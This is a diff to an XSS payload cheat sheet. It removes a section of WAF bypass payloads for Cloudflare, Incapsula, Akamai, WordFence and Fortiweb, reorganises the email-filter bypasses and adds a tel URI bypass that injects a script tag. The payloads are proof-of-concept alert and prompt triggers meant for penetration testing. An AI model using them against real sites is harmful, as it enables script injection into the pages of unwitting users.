@@ -82,23 +82,6 @@
     - [Bypass CSP unsafe-inline](#bypass-csp-unsafe-inline)
     - [Bypass CSP script-src self](#bypass-csp-script-src-self)
     - [Bypass CSP script-src data](#bypass-csp-script-src-data)
-  - [Common WAF Bypass](#common-waf-bypass)
-    - [Cloudflare XSS Bypasses by @Bohdan Korzhynskyi](#cloudflare-xss-bypasses-by-bohdan-korzhynskyi)
-      - [25st January 2021](#25st-january-2021)
-      - [21st April 2020](#21st-april-2020)
-      - [22nd August 2019](#22nd-august-2019)
-      - [5th June 2019](#5th-june-2019)
-      - [3rd June 2019](#3rd-june-2019)
-    - [Cloudflare XSS Bypass - 22nd March 2019 (by @RakeshMane10)](#cloudflare-xss-bypass---22nd-march-2019-by-rakeshmane10)
-    - [Cloudflare XSS Bypass - 27th February 2018](#cloudflare-xss-bypass---27th-february-2018)
-    - [Chrome Auditor - 9th August 2018](#chrome-auditor---9th-august-2018)
-    - [Incapsula WAF Bypass by @Alra3ees- 8th March 2018](#incapsula-waf-bypass-by-alra3ees--8th-march-2018)
-    - [Incapsula WAF Bypass by @c0d3G33k - 11th September 2018](#incapsula-waf-bypass-by-c0d3g33k---11th-september-2018)
-    - [Incapsula WAF Bypass by @daveysec - 11th May 2019](#incapsula-waf-bypass-by-daveysec---11th-may-2019)
-    - [Akamai WAF Bypass by @zseano - 18th June 2018](#akamai-waf-bypass-by-zseano---18th-june-2018)
-    - [Akamai WAF Bypass by @s0md3v - 28th October 2018](#akamai-waf-bypass-by-s0md3v---28th-october-2018)
-    - [WordFence WAF Bypass by @brutelogic - 12th September 2018](#wordfence-waf-bypass-by-brutelogic---12th-september-2018)
-    - [Fortiweb WAF Bypass by @rezaduty - 9th July 2019](#fortiweb-waf-bypass-by-rezaduty---9th-july-2019)
   - [References](#references)
 
 ## Vulnerability Details
@@ -775,19 +758,31 @@ $ echo "<svg^Lonload^L=^Lalert(1)^L>" | xxd
 00000010: 6572 7428 3129 0c3e 0a                   ert(1).>.
 ```
 
+
 ### Bypass email filter
 
-([RFC compliant](http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate))
+* [RFC0822 compliant](http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate)
+  ```javascript
+  "><svg/onload=confirm(1)>"@x.y
+  ```
+
+* [RFC5322 compliant](https://0dave.ch/posts/rfc5322-fun/)
+  ```javascript
+  xss@example.com(<img src='x' onerror='alert(document.location)'>)
+  ```
+
+
+### Bypass tel URI filter
+
+At least 2 RFC mention the `;phone-context=` descriptor:
+
+* [RFC3966 - The tel URI for Telephone Numbers](https://www.ietf.org/rfc/rfc3966.txt)
+* [RFC2806 - URLs for Telephone Calls](https://www.ietf.org/rfc/rfc2806.txt)
 
 ```javascript
-"><svg/onload=confirm(1)>"@x.y
++330011223344;phone-context=<script>alert(0)</script>
 ```
 
-([RFC5322 compliant](https://0dave.ch/posts/rfc5322-fun/))
-
-```javascript
-xss@example.com(<img src='x' onerror='alert(document.location)'>)
-```
 
 ### Bypass document blacklist
 
@@ -1242,110 +1237,10 @@ GET /?xss=<script>alert(1)</script>&a&a&a&a&a&a&a&a...[REPEATED &a 1000 times]&a
 Source: [@pilvar222](https://twitter.com/pilvar222/status/1784618120902005070)
 
 
-## Common WAF Bypass
-
-### Cloudflare XSS Bypasses by [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)
-
-#### 25st January 2021
-
-```html
-<svg/onrandom=random onload=confirm(1)>
-<video onnull=null onmouseover=confirm(1)>
-```
-
-#### 21st April 2020
-
-```html
-<svg/OnLoad="`${prompt``}`">
-```
-
-#### 22nd August 2019
-
-```html
-<svg/onload=%26nbsp;alert`bohdan`+
-```
-
-#### 5th June 2019
-
-```html
-1'"><img/src/onerror=.1|alert``>
-```
-
-#### 3rd June 2019
-
-```html
-<svg onload=prompt%26%230000000040document.domain)>
-<svg onload=prompt%26%23x000000028;document.domain)>
-xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
-```
-
-### Cloudflare XSS Bypass - 22nd March 2019 (by @RakeshMane10)
-
-```
-<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
-```
-
-### Cloudflare XSS Bypass - 27th February 2018
-
-```html
-<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
-```
-
-### Chrome Auditor - 9th August 2018
-
-```javascript
-</script><svg><script>alert(1)-%26apos%3B
-```
-
-Live example by @brutelogic - [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?c1=</script><svg><script>alert(1)-%26apos%3B)
-
-### Incapsula WAF Bypass by [@Alra3ees](https://twitter.com/Alra3ees/status/971847839931338752)- 8th March 2018
-
-```javascript
-anythinglr00</script><script>alert(document.domain)</script>uxldz
-
-anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
-```
-
-### Incapsula WAF Bypass by [@c0d3G33k](https://twitter.com/c0d3G33k) - 11th September 2018
-
-```javascript
-<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
-```
-
-### Incapsula WAF Bypass by [@daveysec](https://twitter.com/daveysec/status/1126999990658670593) - 11th May 2019
-
-```html
-<svg onload\r\n=$.globalEval("al"+"ert()");>
-```
-
-### Akamai WAF Bypass by [@zseano](https://twitter.com/zseano) - 18th June 2018
-
-```javascript
-?"></script><base%20c%3D=href%3Dhttps:\mysite>
-```
-
-### Akamai WAF Bypass by [@s0md3v](https://twitter.com/s0md3v/status/1056447131362324480) - 28th October 2018
-
-```html
-<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
-```
-
-### WordFence WAF Bypass by [@brutelogic](https://twitter.com/brutelogic) - 12th September 2018
-
-```javascript
-<a href=javas&#99;ript:alert(1)>
-```
-
-### Fortiweb WAF Bypass by [@rezaduty](https://twitter.com/rezaduty) - 9th July 2019
-
-```javascript
-\u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
-```
-
 ## Labs
 
 * [PortSwigger Labs for XSS](https://portswigger.net/web-security/all-labs#cross-site-scripting)
+
 
 ## References
 
